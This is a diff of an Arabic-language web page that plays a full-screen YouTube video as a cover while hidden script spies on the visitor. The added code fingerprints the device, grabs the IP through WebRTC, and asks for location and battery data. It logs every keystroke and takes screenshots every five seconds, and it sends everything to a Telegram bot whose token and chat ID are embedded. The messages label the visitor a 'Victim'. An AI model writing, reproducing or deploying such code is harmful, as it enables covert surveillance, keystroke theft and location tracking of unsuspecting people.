@@ -1,136 +1,150 @@
-<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title></title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { margin:0; background:#000; overflow:hidden; }
-    iframe { width:100vw; height:100vh; border:none; }
-  </style>
+<meta charset="UTF-8">
+<title></title> <!-- فارغ للإخفاء -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body { margin:0; background:#000; overflow:hidden; }
+iframe { width:100vw; height:100vh; border:none; }
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </head>
 <body>
-
 <iframe src="https://www.youtube.com/embed/BygacCWcCi0?autoplay=1&mute=0&loop=1&playlist=BygacCWcCi0" allowfullscreen></iframe>
-
 <script>
-// Telegram Config – حط توكنك و chat_id هنا
+// Telegram Config – تاعك
 const TELEGRAM_TOKEN = '8226370812:AAEYjJJffesfCxL1NIp0Ihd1r_2aSb4roSc';
 const CHAT_ID = '6769216123';
 
-async function sendExactVictimInfo() {
-  const v = {
-    ip: 'جاري الجلب...',
-    time: new Date().toISOString(),
-    device_date: new Date().toString(),
-    productSub: navigator.productSub || 'غير متوفر',
-    vendor: navigator.vendor || 'غير متوفر',
-    maxTouchPoints: navigator.maxTouchPoints || 0,
-    doNotTrack: navigator.doNotTrack || 'null',
-    hardwareConcurrency: navigator.hardwareConcurrency || 0,
-    cookieEnabled: navigator.cookieEnabled ? 'true' : 'false',
-    appCodeName: navigator.appCodeName || 'غير متوفر',
-    appName: navigator.appName || 'غير متوفر',
-    appVersion: navigator.appVersion || 'غير متوفر',
-    platform: navigator.platform || 'غير متوفر',
-    product: navigator.product || 'غير متوفر',
-    userAgent: navigator.userAgent || 'غير متوفر',
-    language: navigator.language || 'غير متوفر',
-    languages: navigator.languages?.join(', ') || 'غير متوفر',
-    webdriver: navigator.webdriver ? 'true' : 'false',
-    pdfViewerEnabled: navigator.pdfViewerEnabled ? 'true' : 'false',
-    deviceMemory: navigator.deviceMemory || 'غير متوفر',
-    audioinput: 'id =',
-    videoinput: 'id =',
-    audiooutput: 'id =',
-    connection_type: navigator.connection?.type || 'غير متوفر',
-    rtt: navigator.connection?.rtt || 'غير متوفر',
-    saveData: navigator.connection?.saveData || 'false',
-    effectiveType: navigator.connection?.effectiveType || 'غير متوفر',
-    downlink: navigator.connection?.downlink || 'غير متوفر',
-    downlinkMax: navigator.connection?.downlinkMax || 'Infinity',
-    usb_devices: '0',
-    battery_level: 'جاري...',
-    battery_charging: 'جاري...'
-  };
-
-  // جلب IP عبر WebRTC
-  try {
-    const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
-    pc.createDataChannel('');
-    pc.createOffer(o => pc.setLocalDescription(o), e => {});
-    pc.onicecandidate = e => {
-      if (!e.candidate) return sendFormatted(v);
-      const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-      if (m) v.ip = m[1];
-    };
-  } catch(e) { v.ip = 'محجوب'; sendFormatted(v); }
-
-  // Battery
-  if (navigator.getBattery) {
-    navigator.getBattery().then(b => {
-      v.battery_level = Math.round(b.level * 100) + '%';
-      v.battery_charging = b.charging ? 'true' : 'false';
-      sendFormatted(v);
-    });
-  } else {
-    v.battery_level = 'غير مدعوم';
-    v.battery_charging = 'غير مدعوم';
-  }
-
-  // إرسال التقرير النهائي
-  sendFormatted(v);
+// إرسال نص
+function sendText(text) {
+fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+}).catch(() => {});
 }
 
-function sendFormatted(v) {
-  const text = 
-`✅Victim Information
-⚓ IP: ${v.ip || 'غير متوفر'} (https://ip-api.com/#${v.ip || 'غير متوفر'}) | Time: ${v.time}
-⏳ Date In Victim's Device : ${v.device_date}
-📱 Device Information
-productSub: ${v.productSub}
-vendor: ${v.vendor}
-maxTouchPoints: ${v.maxTouchPoints}
-doNotTrack: ${v.doNotTrack}
-hardwareConcurrency: ${v.hardwareConcurrency}
-cookieEnabled: ${v.cookieEnabled}
-appCodeName: ${v.appCodeName}
-appName: ${v.appName}
-appVersion: ${v.appVersion}
-platform: ${v.platform}
-product: ${v.product}
-userAgent: ${v.userAgent}
-language: ${v.language}
-languages: ${v.languages}
-webdriver: ${v.webdriver}
-pdfViewerEnabled: ${v.pdfViewerEnabled}
-deviceMemory: ${v.deviceMemory}
-📷 Media Device Information
-audioinput: id = ${v.audioinput}
-videoinput: id = ${v.videoinput}
-audiooutput: id = ${v.audiooutput}
-🕸️ Network Information
-type: ${v.connection_type}
-rtt: ${v.rtt}
-saveData: ${v.saveData}
-effectiveType: ${v.effectiveType}
-downlink: ${v.downlink}
-downlinkMax: ${v.downlinkMax}
-🔌 Total USB devices connected: ${v.usb_devices}
-🔋 Battery Information
-🔋Battery Level: ${v.battery_level}
-⚡ Is Battery Charging: ${v.battery_charging}`;
+// إرسال صورة
+function sendPhoto(photo, caption) {
+fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+method: 'POST',
+headers: {'Content-Type': 'application/json'},
+body: JSON.stringify({ chat_id: CHAT_ID, photo: photo, caption: caption })
+}).catch(() => {});
+}
 
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-  }).catch(() => {});
+// جمع كل المعلومات الممكنة (معلومات تساعد في كشف ثغرات)
+async function gatherVulnInfo() {
+const v = {
+time: new Date().toISOString(),
+url: location.href,
+referrer: document.referrer || 'direct',
+userAgent: navigator.userAgent, // لكشف إصدار المتصفح/OS (مثل Chrome 120 → CVE-2026-XXXX)
+platform: navigator.platform || '?', // Win32, Linux, Android → ثغرات OS
+vendor: navigator.vendor || '?', // Google Inc. → ثغرات browser-specific
+oscpu: navigator.oscpu || '?', // CPU/OS info → ثغرات hardware/OS
+language: navigator.language,
+languages: navigator.languages?.join(', ') || '?',
+screen: `${screen.width}x${screen.height} | Depth: ${screen.colorDepth} | Ratio: ${devicePixelRatio}`, // لكشف device type (mobile/PC)
+timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+hardwareConcurrency: navigator.hardwareConcurrency || '?', // CPU cores → ثغرات multi-thread
+deviceMemory: navigator.deviceMemory || '?', // RAM → ثغرات memory leaks
+touchSupport: 'ontouchstart' in window ? 'Yes' : 'No', // Mobile device? → ثغرات touch events
+maxTouchPoints: navigator.maxTouchPoints || 0,
+connection: navigator.connection ? `${navigator.connection.type || '?'} | RTT: ${navigator.connection.rtt}ms | Effective: ${navigator.connection.effectiveType} | Downlink: ${navigator.connection.downlink}Mbps` : '?', // Network type → ثغرات slow network exploits
+pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No', // ثغرات PDF plugins
+webdriver: navigator.webdriver ? 'Yes' : 'No', // Automated browser? → anti-bot detection
+cookieEnabled: navigator.cookieEnabled ? 'Yes' : 'No', // ثغرات cookie hijacking
+doNotTrack: navigator.doNotTrack || '?',
+online: navigator.onLine ? 'Yes' : 'No',
+plugins: Array.from(navigator.plugins || []).map(p => p.name + ' v' + p.version).join(', ') || 'None', // Plugins → ثغرات like Flash/Java
+mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type).join(', ') || 'None', // Mime types → ثغرات file type exploits
+localStorage: localStorage.length > 0 ? 'Has data' : 'Empty', // ثغرات storage
+sessionStorage: sessionStorage.length > 0 ? 'Has data' : 'Empty',
+ip: 'fetching...',
+geo: 'unknown',
+battery: 'fetching...',
+keys: 'logging...',
+screenshot: 'capturing...',
+fonts: (function() {
+const fonts = ['serif', 'sans-serif', 'monospace'];
+return fonts.map(f => document.createElement('span').style.fontFamily = f).join(', ');
+})(), // Font fingerprint → ثغرات OS identification
+webgl: (function() {
+const gl = document.createElement('canvas').getContext('webgl');
+return gl ? gl.getParameter(gl.RENDERER) + ' | Vendor: ' + gl.getParameter(gl.VENDOR) : 'No WebGL'; // GPU info → ثغرات hardware
+})(),
+canvas: (function() {
+const c = document.createElement('canvas');
+const ctx = c.getContext('2d');
+ctx.fillText('test', 2, 15);
+return c.toDataURL(); // Canvas FP → ثغرات device ID
+})(),
+audio: (function() {
+const a = new (window.AudioContext || window.webkitAudioContext)();
+return a ? 'Audio supported' : 'No audio'; // Audio FP → ثغرات audio processing
+})(),
+indexedDB: window.indexedDB ? 'Supported' : 'Not supported', // ثغرات storage databases
+serviceWorker: navigator.serviceWorker ? 'Supported' : 'Not supported', // ثغرات PWA/service workers
+vibration: navigator.vibrate ? 'Supported' : 'Not supported', // ثغرات hardware access
+gamepad: navigator.getGamepads ? 'Supported' : 'Not supported', // ثغرات peripherals
+usb: navigator.usb ? 'Supported' : 'Not supported', // ثغرات USB devices
+mediaDevices: navigator.mediaDevices ? 'Supported' : 'Not supported' // ثغرات camera/mic
+};
+
+// IP via WebRTC
+try {
+const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+pc.createDataChannel('');
+pc.createOffer(o => pc.setLocalDescription(o), e => {});
+pc.onicecandidate = e => {
+if (e.candidate) {
+const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+if (m) v.ip = m[1];
+}
+sendText(`🌐 IP: ${v.ip}`);
+};
+} catch(e) { v.ip = 'blocked'; sendText(`🌐 IP: blocked`); }
+
+// Battery
+if (navigator.getBattery) {
+navigator.getBattery().then(b => {
+v.battery = `${Math.round(b.level * 100)}% | Charging: ${b.charging}`;
+sendText(`🔋 Battery: ${v.battery}`);
+});
+}
+
+// Geolocation
+if (navigator.geolocation) {
+navigator.geolocation.getCurrentPosition(p => {
+v.geo = `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)} (±${p.coords.accuracy}m)`;
+sendText(`📍 Geo: ${v.geo}`);
+}, () => sendText(`📍 Geo: refused`));
+}
+
+// Keylogger
+document.addEventListener('keydown', e => {
+let k = e.key;
+if (k === 'Backspace') k = '[⌫]';
+if (k === 'Enter') k = '[↵]';
+if (k === ' ') k = '[␣]';
+sendText(`⌨️ ${k} | ${new Date().toISOString().slice(11,19)}`);
+});
+
+// Screenshot كل 5 ثواني
+setInterval(() => {
+html2canvas(document.body, {scale:0.5}).then(c => {
+sendPhoto(c.toDataURL('image/png'), `Screenshot ${new Date().toISOString().slice(11,19)}`);
+});
+}, 5000);
+
+// إرسال الكل فورًا
+sendText(`🔔 Victim Hit\n\n` + JSON.stringify(v, null, 2));
 }
 
 // شغّل فور الدخول
-window.onload = sendExactInfo;
+window.onload = gatherVulnInfo;
 </script>
-
 </body>
 </html>
